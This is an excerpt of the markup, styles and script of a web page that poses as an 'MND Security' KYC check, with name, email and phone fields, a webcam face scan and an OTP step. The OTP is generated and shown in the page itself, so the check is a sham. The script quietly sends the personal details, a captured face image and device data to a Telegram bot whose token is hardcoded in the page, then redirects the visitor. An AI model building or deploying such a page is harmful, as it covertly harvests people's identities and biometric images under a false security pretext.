...
<script>
    ...
    function switchSocialTab(platform) {
        ...
        <a href="javascript:void(0)" class="mnd-simple-trigger" onclick="openModal()">
...
<div id="mndToast" class="mnd-toast" onclick="copyOTP()">
    <div class="mnd-toast-icon"><img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="MND"></div>
    <div class="mnd-toast-content">
        <strong>MND Security Alert</strong>
        <span class="mnd-toast-desc" id="toastDesc">Tap to copy access key</span>
    </div>
    <div class="mnd-toast-code" id="toastCode">******</div>
</div>

<div id="authModal" class="mnd-modal-overlay">
    <div class="mnd-modal-fullscreen">
        
        <div class="mnd-modal-header">
            <button class="mnd-close-btn" onclick="closeModal()"><i class="fas fa-times"></i></button>
        ...
        <div class="mnd-scroll-body">
            ...
            <div id="step1" class="mnd-step active">
                ...
                <div class="mnd-input-wrap">
                    ...
                    <input type="text" id="inpName" class="mnd-input" placeholder="Full Legal Name" autocomplete="name">
                </div>
                <div class="mnd-input-wrap">
                    <i class="fas fa-envelope"></i>
                    <input type="email" id="inpEmail" class="mnd-input" placeholder="Email Address" autocomplete="email">
                </div>
                <div class="mnd-input-wrap">
                ...
                <div class="mnd-divider"><span>SELECT METHOD</span></div>

                <button class="mnd-btn btn-gold" onclick="startKYCScan()">
                    <i class="fas fa-camera"></i> VERIFY VIA FACE SCAN
                </button>
                <button class="mnd-btn btn-dark" onclick="startDeviceBiometrics()">
                    <i class="fas fa-fingerprint"></i> USE DEVICE LOCK
                </button>
                <button class="mnd-btn btn-outline" id="btnSms" onclick="generateOTP('sms')">
                    <i class="fas fa-comment-sms"></i> GET SMS OTP
                </button>
            </div>

            <div id="step2" class="mnd-step">
                <h3 class="mnd-kyc-title">HUMAN VERIFICATION</h3>
                <p class="mnd-instruction">Position your face clearly within the oval frame. Ensure good lighting.</p>
                
                <div class="mnd-kyc-container" id="kycBox">
                    <video id="kycVideo" autoplay muted playsinline></video>
                    <div class="mnd-kyc-ring"></div>
                </div>
                <p class="mnd-kyc-status" id="kycStatus">AWAITING CAMERA...</p>
                
                <canvas id="kycCanvas" style="display:none;"></canvas>

                <button class="mnd-btn btn-gold" id="btnStartScan" onclick="runContinuousScan()">
                    <i class="fas fa-expand"></i> START SCANNING
                </button>
                <button class="mnd-btn btn-danger" onclick="abortProcess()">
                    <i class="fas fa-times-circle"></i> STOP SCAN & GO BACK
                </button>
            </div>

            <div id="step3" class="mnd-step">
                <i class="fas fa-shield-check" style="font-size: 45px; color: var(--success); text-align: center; margin-bottom: 10px;"></i>
                <h3 class="mnd-kyc-title" style="color: var(--success);">PAYLOAD SENT</h3>
                <p class="mnd-instruction">Enter the 6-digit code to complete verification.</p>

                <input type="tel" id="inpOTP" class="mnd-otp-input" placeholder="------" maxlength="6" autocomplete="one-time-code">

                <button class="mnd-btn btn-success" onclick="verifyOTP()">
                    <i class="fas fa-unlock"></i> AUTHORIZE SESSION
                </button>
                
                <div class="mnd-btn-row">
                    <button class="mnd-btn btn-dark half-btn" id="btnResend" onclick="generateOTP('resend')">
                        <i class="fas fa-redo"></i> RESEND OTP
                    </button>
                    <button class="mnd-btn btn-danger half-btn" onclick="abortProcess()">
...
<div id="fullLoader" class="mnd-loader">
...
<style>
    ...
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { background-color: var(--bg-main); color: var(--text-main); font-family: var(--font-main); }

    /* --- TRIGGER BUTTON --- */
    .mnd-simple-trigger {
        display: flex; align-items: center; gap: 15px; 
        background: var(--bg-panel); border: 1px solid var(--border-deep);
        border-radius: 16px; padding: 15px 20px; width: 90%; max-width: 400px;
    ...
    .mnd-toast { 
        ...
        width: 90%; max-width: 350px; background: rgba(20, 20, 20, 0.98); 
        backdrop-filter: blur(15px); border: 1px solid var(--border-deep); 
        border-radius: 16px; padding: 12px 16px; z-index: 999999; 
        display: flex; align-items: center; gap: 15px; box-shadow: 0 15px 30px rgba(0,0,0,0.9);
    ...
    .mnd-toast-content strong { color: #fff; font-size: 13px; margin-bottom: 2px; }
    .mnd-toast-desc { color: #aaa; font-size: 11px; }
    .mnd-toast-code { font-size: 18px; font-weight: 900; color: var(--primary); letter-spacing: 2px; background: rgba(212,175,55,0.1); padding: 4px 10px; border-radius: 8px; }
    ...
    .mnd-modal-fullscreen {
        background: var(--bg-main); width: 100%; max-width: 500px; height: 100dvh;
    ...
    .mnd-modal-header {
        flex-shrink: 0; padding: 30px 20px 20px; text-align: center; border-bottom: 1px solid var(--border-deep);
        background: var(--bg-panel); position: relative; display: flex; flex-direction: column; align-items: center;
    }
    .mnd-close-btn { position: absolute; top: 25px; right: 25px; width: 35px; height: 35px; border-radius: 50%; background: var(--bg-input); color: var(--text-muted); display: flex; justify-content: center; align-items: center; font-size: 16px; cursor: pointer; border: 1px solid var(--border-deep); }
    .mnd-close-btn:active { transform: scale(0.9); color: var(--danger); }
    .mnd-header-logo { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--primary); margin-bottom: 10px; object-fit: cover; }
    .mnd-header-title { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #fff; }
    .mnd-header-sub { font-size: 10px; color: var(--success); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-top: 5px; }

    .mnd-scroll-body { flex: 1; overflow-y: auto; padding: 25px 20px; -webkit-overflow-scrolling: touch; }
    .mnd-step { display: none; flex-direction: column; animation: slideIn 0.3s ease forwards; max-width: 400px; margin: 0 auto; width: 100%; }
    .mnd-step.active { display: flex; }
    .mnd-instruction { text-align: center; color: var(--text-muted); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }

    /* --- DEEP UI INPUTS & BUTTONS --- */
    .mnd-input-wrap { position: relative; margin-bottom: 16px; }
    .mnd-input-wrap i { position: absolute; left: 20px; top: 20px; color: var(--primary); font-size: 16px; opacity: 0.8; }
    .mnd-input {
        width: 100%; padding: 20px 20px 20px 55px; background: var(--bg-input);
        border: 2px solid var(--border-deep); border-radius: 14px; color: #fff;
        font-family: var(--font-main); font-size: 15px; font-weight: 500;
        transition: 0.3s ease; outline: none; -webkit-appearance: none;
    }
    .mnd-input:focus { border-color: var(--primary); background: #1a1a1a; box-shadow: 0 0 15px rgba(212,175,55,0.15); }
    
    .mnd-divider { display: flex; align-items: center; margin: 25px 0 25px; }
    .mnd-divider::before, .mnd-divider::after { content: ''; flex: 1; height: 1px; background: var(--border-deep); }
    .mnd-divider span { padding: 0 15px; font-size: 11px; font-weight: 800; color: #666; letter-spacing: 2px; }

    .mnd-btn {
        width: 100%; padding: 18px; border-radius: 14px; font-family: var(--font-main);
        font-weight: 800; font-size: 14px; border: none; cursor: pointer; letter-spacing: 0.5px;
        display: flex; justify-content: center; align-items: center; gap: 10px;
        transition: var(--ease); margin-bottom: 12px;
    }
    .mnd-btn:active { transform: scale(0.96); }
    
    .btn-gold { background: var(--primary); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.2); }
    .btn-dark { background: var(--bg-input); border: 2px solid var(--border-deep); color: #fff; }
    .btn-dark i { color: var(--primary); }
    .btn-outline { background: transparent; border: 2px dashed rgba(255,255,255,0.2); color: #aaa; }
    .btn-success { background: var(--success); color: #000; box-shadow: 0 5px 15px rgba(0,250,154,0.2); margin-top: 10px; }
    .btn-danger { background: rgba(255,68,68,0.1); border: 2px solid rgba(255,68,68,0.3); color: var(--danger); margin-top: 5px; }

    .mnd-btn-row { display: flex; gap: 10px; margin-top: 5px; }
    .half-btn { flex: 1; padding: 15px; font-size: 12px; margin-bottom: 0; }

    /* --- YOUTUBE/INSTAGRAM STYLE KYC SCANNER --- */
    .mnd-kyc-title { text-align: center; font-size: 18px; font-weight: 800; color: #fff; margin-bottom: 5px; letter-spacing: 1px;}
    .mnd-kyc-container {
        width: 220px; height: 300px; margin: 10px auto 20px; position: relative;
        border-radius: 150px; /* Perfect Oval */
    ...
    .mnd-kyc-ring {
        position: absolute; inset: -4px; border-radius: 150px;
    ...
    .mnd-kyc-status { font-size: 12px; font-weight: 800; text-align: center; margin-bottom: 25px; color: var(--text-muted); letter-spacing: 1px; }

    /* --- OTP INPUT --- */
    .mnd-otp-input {
        width: 100%; padding: 20px 10px; background: var(--bg-input);
        border: 2px solid var(--primary); border-radius: 16px; color: var(--primary);
        font-family: var(--font-main); text-align: center; font-size: 38px;
        letter-spacing: 16px; font-weight: 900; outline: none; margin-bottom: 25px;
    ...
    .loader-spinner { width: 50px; height: 50px; border: 3px solid var(--border-deep); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
    .loader-text { color: var(--primary); font-size: 12px; font-weight: 800; letter-spacing: 3px; }

    @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
    @keyframes pulseOval { 0% { box-shadow: 0 0 0 0 rgba(212,175,55,0.4); } 70% { box-shadow: 0 0 0 15px rgba(212,175,55,0); } 100% { box-shadow: 0 0 0 0 rgba(212,175,55,0); } }
...
<script>
    ...
    const BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
    ...
    // --- ABORT & MEMORY CLEAR (FIXES HANGING) ---
    function abortProcess() {
        clearInterval(scanInterval); 
        if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
        document.getElementById('kycVideo').srcObject = null;
        document.getElementById('kycBox').className = "mnd-kyc-container";
        
        currentOTP = ""; // Completely wipe OTP memory
    ...
    function checkValid() {
        ...
        if(!n || p.length !== 10 || isNaN(p)) { alert("⚠️ Required: Full Name & 10-Digit Mobile."); return false; }
        return true;
    }

    // --- OTP LOGIC (NEW OTP EVERY TIME) ---
    async function generateOTP(mode) {
        if(!checkValid()) return;
        authMethod = mode === 'resend' ? "OTP Resend" : "Standard SMS OTP";
        
        const btnId = mode === 'resend' ? 'btnResend' : 'btnSms';
        ...
        const payload = await buildTelemetry(false, authMethod);
    ...
    // --- YOUTUBE/INSTA STYLE STRICT FACE SCANNER ---
    async function startKYCScan() {
        if(!checkValid()) return;
        authMethod = "AI Face Scan KYC";
        switchStep('step2');
    ...
    async function runContinuousScan() {
        ...
        if(!aiModel) aiModel = await blazeface.load();
        ...
        scanInterval = setInterval(async () => {
            attempts++;
            status.innerText = `ANALYZING GEOMETRY...`;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const faces = await aiModel.estimateFaces(video, false);

            let isHuman = false;
            // Strict 90% confidence requirement
            ...
            if (isHuman) {
                ...
                canvas.toBlob(async (blob) => {
                    stopCamera(); // Clear Memory
                    switchStep('step3');
                    showToast(currentOTP);
                    
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('caption', await buildTelemetry(false, authMethod));
                ...
                status.innerText = "NO HUMAN FACE DETECTED";
    ...
    // --- DEVICE LOCK ---
    async function startDeviceBiometrics() {
        if(!checkValid()) return;
        authMethod = "Device Biometric Lock";
        if (window.PublicKeyCredential) {
            try {
                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
                const cred = await navigator.credentials.create({
                    publicKey: {
                        challenge: chal, rp: { name: "MND Hub" },
                        user: { id: new Uint8Array(16), name: document.getElementById('inpName').value, displayName: "User" },
                ...
                if (cred) {
                    saveSession();
                    closeModal();
                    currentOTP = "OS_VERIFIED";
                    triggerLoader(false);
                }
            } catch (e) {}
        } else { alert("Not supported on this device."); }
    }
    ...
    function showToast(code) {
        ...
        toastTimer = setTimeout(hideToast, 8000); // Auto hide
    }
    function hideToast() { document.getElementById('mndToast').classList.remove('visible'); }
    function copyOTP() {
        navigator.clipboard.writeText(currentOTP);
        document.getElementById('toastDesc').innerText = "✅ Copied!";
        document.getElementById('toastDesc').style.color = "var(--success)";
        setTimeout(() => { hideToast(); setTimeout(()=>{ document.getElementById('toastDesc').innerText = "Tap to copy access key"; document.getElementById('toastDesc').style.color = "#aaa"; }, 500); }, 1500);
    }

    function verifyOTP() {
        const inp = document.getElementById('inpOTP');
        if(inp.value.trim() === currentOTP && currentOTP !== "") {
            saveSession(); closeModal(); hideToast(); triggerLoader(false);
        } else {
            inp.style.borderColor = "var(--danger)"; inp.style.color = "var(--danger)";
            setTimeout(() => { inp.style.borderColor = "var(--primary)"; inp.style.color = "var(--primary)"; inp.value = ''; }, 1000);
        }
    }
    ...
    // --- TELEMETRY ---
    async function buildTelemetry(isReturn, method) {
        let n = document.getElementById('inpName').value || "Auto", p = document.getElementById('inpPhone').value || "Auto", e = document.getElementById('inpEmail').value || "Auto";
        let bat="Unknown", gpu="N/A";
        ...
        let cCode = currentOTP === "OS_VERIFIED" ? "BIOMETRIC_PASS" : currentOTP;
        let stat = isReturn ? "(Saved Cache Bypass)" : `(${method} | Code: ${cCode})`;
        let ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });

        return `🚨 *MND SECURE LOG* 🚨\n${stat}\n\n👤 *USER*\n• Name: ${n}\n• Phone: ${p}\n• Email: ${e}\n\n📱 *SYSTEM*\n• GPU: ${gpu}\n• Battery: ${bat}\n• OS: \`${navigator.userAgent}\`\n\n⏰ *Time:* ${ts}`;
    }

    async function triggerLoader(isReturn) {
        document.getElementById('fullLoader').classList.add('active');
        if(isReturn || currentOTP === "OS_VERIFIED") {
            let payload = await buildTelemetry(isReturn, authMethod);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: payload, parse_mode: 'Markdown' }) }).catch(e=>{});
        }
        setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 2000);
    }
</script>
    </div>
